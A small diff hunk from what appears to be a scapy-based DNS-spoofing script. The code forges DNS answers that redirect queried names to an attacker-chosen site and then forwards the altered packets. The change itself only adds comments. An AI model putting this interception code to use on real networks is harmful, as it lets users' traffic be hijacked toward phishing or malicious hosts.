@@ -21,13 +21,14 @@ def process_packet(packet):
             answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_site)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
-
+            # Recalculate these (scapy)
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].chksum
             del scapy_packet[scapy.UDP].len
-
+            # Set modified scapy_packet as payload in packet
             packet.set_payload(str(scapy_packet))
+    # Forward
     packet.accept()
 
 
